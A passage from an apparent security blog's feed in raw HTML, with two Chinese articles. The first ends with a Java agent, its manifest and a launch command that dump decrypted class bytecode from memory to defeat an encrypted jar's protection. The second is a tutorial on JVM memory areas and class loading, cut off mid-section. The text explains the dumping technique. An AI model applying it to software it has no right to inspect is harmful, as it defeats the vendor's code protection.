class="keyword">null</span>;</span><br><span class="line">        FileOutputStream fileOutputStream = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String folder = OUT_FOLDER;</span><br><span class="line">            <span class="keyword">if</span> (!folder.endsWith(File.separator)) &#123;</span><br><span class="line">                folder = folder + File.separator;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String classPath = className.substring(<span class="number">0</span>, className.lastIndexOf(<span class="string">"/"</span>));</span><br><span class="line">            className = className.substring(className.lastIndexOf(<span class="string">"/"</span>) + <span class="number">1</span>, className.length());</span><br><span class="line"></span><br><span class="line">            String path = OUT_FOLDER + File.separator + classPath;</span><br><span class="line">            file = <span class="keyword">new</span> File(path);</span><br><span class="line">            <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">                file.mkdirs();</span><br><span class="line">            &#125;</span><br><span class="line">            file = <span class="keyword">new</span> File(path + File.separator + className + <span class="string">".class"</span>);</span><br><span class="line"></span><br><span class="line">            fileOutputStream = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">            fileOutputStream.write(classfileBuffer);</span><br><span class="line"></span><br><span class="line">            fileOutputStream.flush();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (fileOutputStream != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    fileOutputStream.close();</span><br><span class="line">                    fileOutputStream = <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置文件META-INF/MANIFEST.MF，Premain-Class用于指定上面的premain()函数所在的Class，注意最后必须空一行出来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Premain-Class: com.dumpclass.MainAgent</span><br></pre></td></tr></table></figure><p>打包成DumpClass.jar。</p><p>通过以下命令，指定JavaAgent的jar包，然后在目标jar包主执行类方法执行之前先执行DumpClass.jar中的premain()方法，从而从内存将加密的目标jar类的字节码Dump下来：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Ddump_package=com.mi1k7ea -Ddump_out_folder=/tmp -agentlib:decrypt -javaagent:DumpClass.jar -jar ClassEncode_encrypt.jar</span><br></pre></td></tr></table></figure><p><img src="/2020/05/10/浅析Java-Instrument插桩技术/6.png" alt=""></p><p>下载下来，此时就能从成功反编译获取到加密class文件的内容了：</p><p><img src="/2020/05/10/浅析Java-Instrument插桩技术/7.png" alt=""></p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://www.cnblogs.com/kokov/p/12120033.html" target="_blank" rel="noopener">java agent技术原理及简单实现</a></p><p><a href="https://www.cnblogs.com/paul-blog/p/11048094.html" target="_blank" rel="noopener">字节码插桩技术</a></p><p><a href="http://rui0.cn/archives/1063" target="_blank" rel="noopener">插桩技术在Java安全中的应用简述</a></p><p><a href="https://www.ibm.com/developerworks/cn/java/j-lo-jse61/" target="_blank" rel="noopener">Java SE 6 新特性：Instrumentation 新功能</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-Java-Instrument&quot;&gt;&lt;a href=&quot;#0x01-Java-Instrument&quot; class=&quot;headerlink&quot; title=&quot;0x01 Java Instrument&quot;&gt;&lt;/a&gt;0x01 Java Instrument&lt;/h2&gt;&lt;
      
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>浅析JVM</title>
    <link href="https://www.mi1k7ea.com/2020/05/08/%E6%B5%85%E6%9E%90JVM/"/>
    <id>https://www.mi1k7ea.com/2020/05/08/浅析JVM/</id>
    <published>2020-05-08T14:47:34.000Z</published>
    <updated>2020-05-08T15:10:12.036Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本文直接参考或引自网上文章。</p><h2 id="0x01-JVM简介"><a href="#0x01-JVM简介" class="headerlink" title="0x01 JVM简介"></a>0x01 JVM简介</h2><p>JVM是Java Virtual Machine（Java虚拟机）的缩写，JVM是一种用于计算设备的规范，它是一个虚构出来的计算机，是通过在实际的计算机上仿真模拟各种计算机功能来实现的。</p><p>引入Java语言虚拟机后，Java语言在不同平台上运行时不需要重新编译。Java语言使用Java虚拟机屏蔽了与具体平台相关的信息，使得Java语言编译程序只需生成在Java虚拟机上运行的目标代码（字节码），就可以在多种平台上不加修改地运行。</p><p>Java虚拟机有自己完善的硬件架构，如处理器、堆栈等，还具有相应的指令系统。</p><p>Java虚拟机本质上就是一个程序，当它在命令行上启动的时候，就开始执行保存在某字节码文件中的指令。Java语言的可移植性正是建立在Java虚拟机的基础上。任何平台只要装有针对于该平台的Java虚拟机，字节码文件（.class）就可以在该平台上运行。这就是“一次编译，多次运行”。</p><p>Java虚拟机不仅是一种跨平台的软件，而且是一种新的网络计算平台。该平台包括许多相关的技术，如符合开放接口标准的各种API、优化技术等。Java技术使同一种应用可以运行在不同的平台上。Java平台可分为两部分，即Java虚拟机（Java virtual machine，JVM）和Java API类库。</p><p>JVM特性：</p><ul><li>移植性：无论是GC还是Hotspot都可以用在任何Java可用的地方。比方说，JRuby可以运行在其他平台上，Rails应用就可以运行在IBM主机上的JRuby上，而且这台IBM主机运行的是CP/CMS.实际上，由于Java和OpenJDK项目的开源，我们正在看到越来越多的平台的衍生，因此JVM的移植性也将越来越棒。</li><li>成熟：JVM已有多年的历史，在过去的这些年里，许多开发者为它做出了许多贡献，使得它的性能一次又一次地提升，让JVM变得更加稳定、快速和广泛。</li><li>覆盖面：JRuby和JVM上的其他语言项目已经被承认，一个例子是invokedynamic specification（akaJSR292）。JSR越来越配合新的语言，JVM已不再是Java一个人定制规则。JVM正在构建成为类如JRuby等项目的优良平台。还有一个MLVM（multiple languageVM）项目，好比是新特性的清算机构，是一个许多企业应用的开发者试图添加应用的地方，而这些应用正是他们想在JVM中看到的。而且JVM开发者互相协作、彼此影响，无疑这有利于JVM新特性的诞生。这些细节都可以看到JVM正在关注开发者的需求，扩大他的覆盖面。</li></ul><h2 id="0x02-体系结构"><a href="#0x02-体系结构" class="headerlink" title="0x02 体系结构"></a>0x02 体系结构</h2><p>Java虚拟机主要分为五大模块：类装载器子系统、运行时数据区、执行引擎、本地方法接口和垃圾收集模块。其中垃圾收集模块在Java虚拟机规范中并没有要求Java虚拟机垃圾收集，但是在没有发明无限的内存之前，大多数JVM实现都是有垃圾收集的。而运行时数据区都会以某种形式存在于每一个JAVA虚拟机实例中，但是Java虚拟机规范对它的描述却是相当抽象。这些运行时数据结构上的细节，大多数都由具体实现的设计者决定。</p><p>Java虚拟机不是真实的物理机，它没有寄存器，所以指令集是使用Java栈来存储中间数据，这样做的目的就是为了保持Java虚拟机的指令集尽量的紧凑，同时也便于JAVA虚拟机在那些只有很少通用寄存器的平台上实现。另外，JAVA虚拟机的这种基于栈的体系结构，有助于运行时某些虚拟机实现的动态编译器和即时编译器的代码优化。</p><p>下面对JVM体系结构中的五大模块分别进行说明。</p><h2 id="0x03-运行时数据区"><a href="#0x03-运行时数据区" class="headerlink" title="0x03 运行时数据区"></a>0x03 运行时数据区</h2><p>JVM体系结构如图：</p><p><img src="/2020/05/08/浅析JVM/1.png" alt=""></p><p>几个主要区域的特点归纳如下：</p><p><img src="/2020/05/08/浅析JVM/2.png" alt=""></p><p>各个空间的内存分配如下：</p><p><img src="/2020/05/08/浅析JVM/3.png" alt=""></p><h3 id="程序计数器"><a href="#程序计数器" class="headerlink" title="程序计数器"></a>程序计数器</h3><p>线程私有。</p><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>字节码解释器工作通过改变程序计数器的值来选取下一条需要执行的字节码指令。分支、循环、跳转、异常处理、线程恢复等基础功能都需要依赖程序计数器来完成。</p><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>JVM的多线程是通过线程轮流切换并分配处理器执行时间的方式来实现的，为了各条线程之间的切换后计数器能恢复到正确的执行位置，所以每条线程都会有一个独立的程序计数器。</p><p>当线程正在执行一个Java方法，程序计数器记录的是正在执行的JVM字节码指令的地址；如果正在执行的是一个Natvie（本地方法），那么这个计数器的值则为空（Underfined）。</p><p>程序计数器占用的内存空间很少，也是唯一一个在JVM规范中没有规定任何OutOfMemoryError（内存不足错误）的区域。</p><h3 id="Java虚拟机栈"><a href="#Java虚拟机栈" class="headerlink" title="Java虚拟机栈"></a>Java虚拟机栈</h3><p>线程私有。</p><h4 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h4><p>Java虚拟机栈保存内容：存储局部变量，操作数栈，动态链接，方法出口。</p><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>与程序计数器一样，Java虚拟机栈也是线程私有的，用通俗的话将它就是我们常常听说到堆栈中的那个“栈内存”。</p><p>虚拟机栈描述的是Java方法执行的内存模型：每个方法在执行的同时都会创建一个栈帧(Stack Frame)用于存储局部变量表（局部变量表需要的内存在编译期间就确定了所以在方法运行期间不会改变大小），操作数栈，动态链接，方法出口等信息。</p><p>栈是Java方法执行的内存模型：每个方法被执行的时候都会创建一个“栈帧”用于存储局部变量表(包括参数)、操作栈、方法出口等信息。每一个方法从调用至出栈的过程，就对应着栈帧在虚拟机中从入栈到出栈的过程。</p><p>栈的生命周期是跟随线程的生命周期，线程创建时创建，线程结束栈内存也就释放，是线程私有的。</p><p>本地方法栈和Java虚拟机栈的区别：Java虚拟机栈为虚拟机执行的Java方法服务，而本地方法栈则是为Native方法服务。</p><h4 id="保存具体内容"><a href="#保存具体内容" class="headerlink" title="保存具体内容"></a>保存具体内容</h4><p>如图：</p><p><img src="/2020/05/08/浅析JVM/6.png" alt=""></p><h5 id="局部变量表"><a href="#局部变量表" class="headerlink" title="局部变量表"></a>局部变量表</h5><p>局部变量表是一组变量值存储空间，用于存放方法参数和方法内部定义的局部变量。在Java程序被编译成Class文件时，就在方法的Code属性的max_locals数据项中确定了该方法所需要分配的最大局部变量表的容量。</p><p>局部变量表的容量以变量槽（Slot）为最小单位，32位虚拟机中一个Slot可以存放一个32位以内的数据类型（boolean、byte、char、short、int、float、reference和returnAddress八种）。</p><p>reference类型虚拟机规范没有明确说明它的长度，但一般来说，虚拟机实现至少都应当能从此引用中直接或者间接地查找到对象在Java堆中的起始地址索引和方法区中的对象类型数据。</p><p>returnAddress类型是为字节码指令jsr、jsr_w和ret服务的，它指向了一条字节码指令的地址。</p><p>虚拟机是使用局部变量表完成参数值到参数变量列表的传递过程的，如果是实例方法（非static），那么局部变量表的第0位索引的Slot默认是用于传递方法所属对象实例的引用，在方法中通过this访问。</p><p>Slot是可以重用的，当Slot中的变量超出了作用域，那么下一次分配Slot的时候，将会覆盖原来的数据。Slot对对象的引用会影响GC（要是被引用，将不会被回收）。</p><p>系统不会为局部变量赋予初始值（实例变量和类变量都会被赋予初始值）。也就是说不存在类变量那样的准备阶段。</p><h5 id="操作数栈"><a href="#操作数栈" class="headerlink" title="操作数栈"></a>操作数栈</h5><p>操作数栈和局部变量区一样，操作数栈也是被组织成一个以字长为单位的数组。但是和前者不同的是，它不是通过索引来访问，而是通过标准的栈操作——压栈和出栈来访问的。比如，如果某个指令把一个值压入到操作数栈中，稍后另一个指令就可以弹出这个值来使用。</p><p>虚拟机在操作数栈中存储数据的方式和在局部变量区中是一样的：如int、long、float、double、reference和returnType的存储。对于byte、short以及char类型的值在压入到操作数栈之前，也会被转换为int。</p><p>虚拟机把操作数栈作为它的工作区——大多数指令都要从这里弹出数据，执行运算，然后把结果压回操作数栈。比如，iadd指令就要从操作数栈中弹出两个整数，执行加法运算，其结果又压回到操作数栈中，看看下面的示例，它演示了虚拟机是如何把两个int类型的局部变量相加，再把结果保存到第三个局部变量的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">begin</span><br><span class="line">iload_0    // push the int in local variable 0 ontothe stack</span><br><span class="line">iload_1    //push the int in local variable 1 onto the stack</span><br><span class="line">iadd       // pop two ints, add them, push result</span><br><span class="line">istore_2   // pop int, store into local variable 2</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>在这个字节码序列里，前两个指令iload_0和iload_1将存储在局部变量中索引为0和1的整数压入操作数栈中，其后iadd指令从操作数栈中弹出那两个整数相加，再将结果压入操作数栈。第四条指令istore_2则从操作数栈中弹出结果，并把它存储到局部变量区索引为2的位置。</p><p>下图详细表述了这个过程中局部变量和操作数栈的状态变化，图中没有使用的局部变量区和操作数栈区域以空白表示：</p><p><img src="/2020/05/08/浅析JVM/7.png" alt=""></p><h5 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h5><p>动态链接 : 虚拟机运行的时候，运行时常量池会保存大量的符号引用，这些符号引用可以看成是每个方法的间接引用。如果代表栈帧A的方法想调用代表栈帧B的方法，那么这个虚拟机的方法调用指令就会以B方法的符号引用作为参数，但是因为符号引用并不是直接指向代表B方法的内存位置，所以在调用之前还必须要将符号引用转换为直接引用，然后通过直接引用才可以访问到真正的方法。</p><p>如果符号引用是在类加载阶段或者第一次使用的时候转化为直接应用，那么这种转换成为静态解析。</p><p>如果是在运行期间转换为直接引用，那么这种转换就成为动态链接。</p><h5 id="返回地址"><a href="#返回地址" class="headerlink" title="返回地址"></a>返回地址</h5><p>方法的返回分为两种情况：</p><ul><li>一种是正常退出，退出后会根据方法的定义来决定是否要传返回值给上层的调用者。</li><li>一种是异常导致的方法结束，这种情况是不会传返回值给上层的调用方法。</li></ul><p>不过无论是那种方式的方法结束，在退出当前方法时都会跳转到当前方法被调用的位置。</p><ul><li>如果方法是正常退出的，则调用者的PC计数器的值就可以作为返回地址；</li><li>如果是因为异常退出的，则是需要通过异常处理表来确定。</li></ul><p>方法的一次调用就对应着栈帧在虚拟机栈中的一次入栈出栈操作，因此方法退出时可能做的事情包括：恢复上层方法的局部变量表以及操作数栈，如果有返回值的话，就把返回值压入到调用者栈帧的操作数栈中，还会把PC计数器的值调整为方法调用入口的下一条指令。</p><p>关于Java栈的更多解析可以查阅下文：<a href="https://www.jianshu.com/p/15932712fcb4" target="_blank" rel="noopener">https://www.jianshu.com/p/15932712fcb4</a></p><p><img src="/2020/05/08/浅析JVM/8.png" alt=""></p><h3 id="本地方法栈"><a href="#本地方法栈" class="headerlink" title="本地方法栈"></a>本地方法栈</h3><p>线程私有。</p><h4 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h4><p>主要用于存储本地方法的局部变量表，本地方法的操作数栈等信息。</p><h4 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h4><p>栈作为一种线性的管道结构，遵循先进后出的原则。当栈内的数据在超出其作用域后，会被自动释放掉。</p><p>本地方法栈是在程序调用或JVM调用本地方法接口（Native）时候启用。</p><p>本地方法栈和Java虚拟机栈的区别：Java虚拟机栈为虚拟机执行的Java方法服务，而本地方法栈则是为Native方法服务。</p><h3 id="Java堆（Heap）"><a href="#Java堆（Heap）" class="headerlink" title="Java堆（Heap）"></a>Java堆（Heap）</h3><p>各线程共享区域。</p><h4 id="作用-3"><a href="#作用-3" class="headerlink" title="作用"></a>作用</h4><p>Java堆是一个运行时的数据区，用来存储数据的单元，存放通过new关键字新建的对象和数组，对象从中分配内存。</p><h4 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h4><p>在堆中声明的对象，是不能直接访问的，必须通过在栈中声明的指向该引用的变量来调用。引用变量就相当于是为数组或对象起的一个名称，以后就可以在程序中使用栈中的引用变量来访问堆中的数组或对象。</p><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ul><li>Java虚拟机所管理的内存中最大的一块。Java堆是被所有线程共享的一块内存区域，在虚拟机启动时创建。</li><li>此内存区域的唯一目的就是存放对象实例，几乎所有的对象实例都在这里分配内存。几乎所有的对象实例以及数组都要在堆上分配。</li><li>Java堆是GC管理的区域，也称为GC堆。</li><li>Java堆中还细分为：新生代，老年代；再细分一点有Eden空间，From Survivor（sərˈvaɪvə(r)，幸存者）空间，To Survivor空间。</li></ul><h4 id="堆的结构"><a href="#堆的结构" class="headerlink" title="堆的结构"></a>堆的结构</h4><p>堆内存是所有线程共有的，可以分为两个部分：新生代和老年代、永久代(HotSpot有)。下图中的Perm代表的是永久代，但是注意永久代并不属于堆内存中的一部分，同时jdk1.8之后永久代也将被移除。</p><p><img src="/2020/05/08/浅析JVM/4.png" alt=""></p><h5 id="新生代"><a href="#新生代" class="headerlink" title="新生代"></a>新生代</h5><p>程序新创建的对象都是从新生代分配内存，新生代由Eden Space和两块相同大小的Survivor Space(通常又称S0和S1或From和To)构成。</p><p>可通过-Xmn参数来指定新生代的大小；也可以通过-XX:SurvivorRation来调整Eden Space及SurvivorSpace的大小。</p><ul><li><p>新生代的初始值NewSize默认为1M，最大值需要设置，可以通过参数-XX:NewSize和-XX:MaxNewSize或-Xmn进行设置；</p></li><li><p>为老年代与新生代的大小比值，默认为2：1；</p></li><li><p>SurvivorRatio为新生代中Eden和Survivor的大小比值，默认为8：1</p><p>Edem : from : to = 8 :1 : 1</p><p>可以通过参数-XX:SurvivorRatio来设定，即： Eden = 8/10 的新生代空间大小，from = to = 1/10 的新生代空间大小。</p></li></ul><p>JVM每次只会使用Eden和其中的一块Survivor区域来为对象服务，所以无论什么时候，总是有一块Survivor区域是空闲着的。</p><p>新生代实际可用的内存空间为 9/10 ( 即90%)的新生代空间。</p><p>Eden区 、From区 - Surivivor 0 、To 区 - Surivivor 1：</p><ul><li>在未开始GC的时候，对象只会存在于Eden区和名为“From”的Survivor区，Survivor区“To”是空的。</li><li>紧接着进行GC，Eden区中所有存活的对象都会被复制到“To”，而在“From”区中，仍存活的对象会根据他们的年龄值来决定去向。</li><li>年龄达到一定值(年龄阈值，可以通过-XX:MaxTenuringThreshold来设置)的对象会被移动到年老代中，没有达到阈值的对象会被复制到“To”区域。经过这次GC后，Eden区和From区已经被清空。</li><li>这个时候，“From”和“To”会交换他们的角色，也就是新的“To”就是上次GC前的“From”，新的“From”就是上次GC前的“To”。不管怎样，都会保证名为To的Survivor区域是空的。</li><li>Minor GC会一直重复这样的过程，直到“To”区被填满，“To”区被填满之后，会将所有对象移动到年老代中。</li></ul><h5 id="老生代"><a href="#老生代" class="headerlink" title="老生代"></a>老生代</h5><p>用于存放经过多次新生代GC仍然存活的对象，例如缓存对象，新建的对象也有可能直接进入老年代，主要有两种情况：</p><ul><li>大对象，可通过启动参数设置-XX:PretenureSizeThreshold=1024(单位为字节，默认为0)来代表超过多大时就不在新生代分配，而是直接在老年代分配。</li><li>大的数组对象，且数组中无引用外部对象。</li></ul><p>老年代所占的内存大小为-Xmx对应的值减去-Xmn对应的值。</p><p>如果在堆中没有内存完成实例分配，并且堆也无法再扩展时，将会抛出OutOfMemoryError异常。</p><h5 id="永生代"><a href="#永生代" class="headerlink" title="永生代"></a>永生代</h5><p>永久代可以简单理解为方法区（本质上两者并不等价）</p><p>如上文所说：对于习惯在HotSpot虚拟机上开发和部署程序的开发者来说，很多人愿意把方法区称为“永久代”，本质上两者并不等价。仅仅是因为HotSpot虚拟机的设计团队选择把GC分代收集扩展至方法区，或者说使用永久代来实现方法区而已。</p><p>对于其他虚拟机（如BEA JRockit、IBM J9等）来说是不存在永久代的概念的。</p><p>即使是HotSpot虚拟机本身，根据官方发布的路线图信息，现在也有放弃永久代并“搬家”至Native Memory来实现方法区的规划了：</p><ul><li>Jdk1.6及之前：常量池分配在永久代；</li><li>Jdk1.7：有，但已经逐步“去永久代”；</li><li>Jdk1.8及之后：没有永久代(java.lang.OutOfMemoryError: PermGen space,这种错误将不会出现在JDK1.8中)；</li></ul><h3 id="方法区（Method-Area）"><a href="#方法区（Method-Area）" class="headerlink" title="方法区（Method Area）"></a>方法区（Method Area）</h3><p>各线程共享区域。</p><h4 id="作用-4"><a href="#作用-4" class="headerlink" title="作用"></a>作用</h4><p><strong>方法区保存内容：类信息、常量、静态变量、即时编译器编译后的代码等数据。</strong></p><p>类信息具体内容：</p><ul><li>类型信息：全限定名、直接超类的全限定名、类的类型还是接口类型、访问修饰符、直接超接口的全限定名的有序列表</li><li>字段信息：字段名、字段类型、字段的修饰符</li><li>方法信息：方法名、方法返回类型、方法参数的数量和类型（按照顺序）、方法的修饰符</li><li>其他信息：除了常量以外的所有类（静态）变量、一个指向ClassLoader的指针、一个指向Class对象的指针、常量池（常量数据以及对其他类型的符号引用）</li></ul><h4 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h4><p>类型信息是由类加载器在类加载的过程中从类文件中提取出来的信息。</p><p>需要注意的一点是，常量池也存放于方法区中。</p><p>程序中所有的线程共享一个方法区，所以访问方法区的信息必须确保线程是安全的。如果有两个线程同时去加载一个类，那么只能有一个线程被允许去加载这个类，另一个必须等待。</p><p>在程序运行时，方法区的大小是可以改变的，程序在运行时可以扩展。</p><p>方法区也可以被垃圾回收，但条件非常严苛，必须在该类没有任何引用的情况下。</p><h4 id="已装载类详细信息"><a href="#已装载类详细信息" class="headerlink" title="已装载类详细信息"></a>已装载类详细信息</h4><ul><li><p>运行时常量池：在方法区中，每个类型都对应一个常量池，存放该类型所用到的所有常量，常量池中存储了诸如文字字符串、final变量值、类名和方法名常量。</p></li><li><p>字段信息：字段信息存放类中声明的每一个字段的信息，包括字段的名、类型、修饰符。</p></li><li><p>字段名称：指的是类或接口的实例变量或类变量，字段的描述符是一个指示字段的类型的字符串，如<code>private A a=null;</code>则a为字段名，A为描述符，private为修饰符</p></li><li><p>方法信息：类中声明的每一个方法的信息，包括方法名、返回值类型、参数类型、修饰符、异常、方法的字节码。(在编译的时候，就已经将方法的局部变量、操作数栈大小等确定并存放在字节码中，在装载的时候，随着类一起装入方法区。)</p></li><li><p>静态变量：就是类变量，类的所有实例都共享，在方法区有个静态区，静态区专门存放静态变量和静态块。</p></li><li><p>到类classloader的引用：到该类的类装载器的引用。</p></li><li><p>到类class的引用：虚拟机为每一个被装载的类型创建一个class实例，用来代表这个被装载的类。</p></li></ul><h4 id="运行时常量池"><a href="#运行时常量池" class="headerlink" title="运行时常量池"></a>运行时常量池</h4><p>Java常量池实际上分为两种形态：静态常量池和运行时常量池。方法区Method Area包含运行时常量池。</p><ul><li>静态常量池 ，即*.class文件中的常量池。class文件中的常量池不仅仅包含字符串(数字)字面量，还包含类、方法的信息，它们占用class文件绝大部分空间。</li><li>运行时常量池 ，则是jvm虚拟机在完成类装载操作后，将class文件中的常量池载入到内存中，并保存在方法区中，我们常说的常量池，就是指方法区中的运行时常量池。</li></ul><p>运行时常量池（Constant Pool Table），用于存放编译期生成的各种字面量、符号引用，String字符串、final变量值、类和结构的完全限定名，方法的名称和描述符，字段的名称和描述符，这部分内容将在类加载后存放到方法区的运行时常量池中。它们以数组形式通过索引被访问，是外部调用与类联系及类型对象化的桥梁。</p><p>在运行时，JVM从常量池中获得符号引用，然后在运行时解析成引用项的实际地址，最后通过常量池中的全限定名、方法和字段描述符，把当前类或接口中的代码与其它类或接口中的代码联系起来。</p><p>运行时常量池中的常量，基本来源于各个class文件中的常量池。</p><p>程序运行时，除非手动向常量池中添加常量(比如调用intern方法)，否则jvm不会自动添加常量到常量池。</p><p><img src="/2020/05/08/浅析JVM/5.png" alt=""></p><p>运行时常量池除了存放编译期产生的Class文件的常量外，还可存放在程序运行期间生成的新常量，比较常见增加新常量方法有String类的intern()方法。</p><p>String.intern()是一个Native方法，它的作用是：如果运行时常量池中已经包含一个等于此String对象内容的字符串，则返回常量池中该字符串的引用；如果没有，则在常量池中创建与此String内容相同的字符串，并返回常量池中创建的字符串的引用。</p><p>不过JDK7的intern()方法的实现有所不同，当常量池中没有该字符串时，不再是在常量池中创建与此String内容相同的字符串，而改为在常量池中记录堆中首次出现的该字符串的引用，并返回该引用。</p><p>由于运行时常量池在方法区中，我们可以通过JVM参数：<code>-XX:PermSize</code>、<code>-XX:MaxPermSize</code>来设置方法区大小，从而间接限制常量池大小。</p><p>在JDK8中，移除了方法区，转而用Metaspace区域替代，所以我们需要使用新的JVM参数：<code>-XX:MaxMetaspaceSize</code></p><p>但是，JDK1.7之前运行时常量池是方法区的一部分，JDK1.7及之后版本已经将运行时常量池从方法区中移了出来，在堆（Heap）中开辟了一块区域存放运行时常量池。</p><h2 id="0x04-类加载机制"><a href="#0x04-类加载机制" class="headerlink" title="0x04 类加载机制"></a>0x04 类加载机制</h2><h3 id="类加载简介"><a href="#类加载简介" class="headerlink" title="类加载简介"></a>类加载简介</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>类加载指的是将类的.class文件中的二进制数据读入到内存中，将其放在运行时数据区的方法区内，然后在堆区创建一个java.lang.Class对象，用来封装类在方法区内的数据结构。</p><h4 id="所处环节"><a href="#所处环节" class="headerlink" title="所处环节"></a>所处环节</h4><p>在介绍类加载机制之前，先来看看，类的加载机制在整个Java程序运行期间处于一个什么环节，下面使用一张图来表示：</p><p><img src="/2020/05/08/浅析JVM/9.png" alt=""></p><p>从上图可以看，Java文件通过编译器变成了.class文件，接下来类加载器又将这些.class文件加载到JVM中。其中类装载器的作用其实就是类的加载。</p><h4 id="何时才会启动类加载器"><a href="#何时才会启动类加载器" class="headerlink" title="何时才会启动类加载器"></a>何时才会启动类加载器</h4><p>其实，类加载器并不需要等到某个类被“首次主动使用”时再加载它，JVM规范允许类加载器在预料某个类将要被使用时就预先加载它，如果在预先加载的过程中遇到了.class文件缺失或存在错误，类加载器必须在程序首次主动使用该类时才报告错误（LinkageError错误）。如果这个类一直没有被程序主动使用，那么类加载器就不会报告错误。</p><h4 id="何处去加载-class文件"><a href="#何处去加载-class文件" class="headerlink" title="何处去加载.class文件"></a>何处去加载.class文件</h4><p>在这里进行一个简单的分类。例举了5个来源:</p><ol><li>本地磁盘</li><li>网上加载.class文件（Applet）</li><li>从数据库中</li><li>压缩文件中（ZAR，jar等）</li><li>从其他文件生成的（JSP应用）</li></ol><h3 id="类加载过程"><a href="#类加载过程" class="headerlink" title="类加载过程"></a>类加载过程</h3><h4 id="总过程"><a href="#总过程" class="headerlink" title="总过程"></a>总过程</h4><p>类从被加载到虚拟机内存中开始，到卸载出内存为止，它的整个生命周期包括：加载、验证、准备、解析、初始化、使用和卸载等七个阶段。它们的顺序如下图所示：</p><p><img src="/2020/05/08/浅析JVM/10.png" alt=""></p><p>其中类加载的过程包括了<strong>加载、验证、准备、解析、初始化</strong>五个阶段。</p><p>在这五个阶段中，加载、验证、准备和初始化这四个阶段发生的顺序是确定的，而解析阶段则不一定，它在某些情况下可以在初始化阶段之后开始。</p><p>另外注意这里的几个阶段是按顺序开始，而不是按顺序进行或完成，因为这些阶段通常都是互相交叉地混合进行的，通常在一个阶段执行的过程中调用或激活另一个阶段。</p><p>启动时如果加上如下系统参数，即可跟踪JVM类的加载：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-XX：+TraceClassLoading</span><br></pre></td></tr></table></figure><h4 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h4><p>”加载“是”类加载机制”的第一个过程，在加载阶段，虚拟机主要完成三件事：</p><ol><li>通过一个类的全限定名来获取其定义的二进制字节流；</li><li>将这个字节流所代表的的静态存储结构转化为方法区的运行时数据结构；</li><li>在堆中生成一个代表这个类的Class对象，作为方法区中这些数据的访问入口。</li></ol><p>相对于类加载的其他阶段而言，加载阶段是可控性最强的阶段，因为程序员可以使用系统的类加载器加载，还可以使用自己的类加载器加载。我们在最后一部分会详细介绍这个类加载器。在这里我们只需要知道类加载器的作用就是上面虚拟机需要完成的三件事，仅此而已就好了。</p><h4 id="验证"><a href="#验证" class="headerlink" 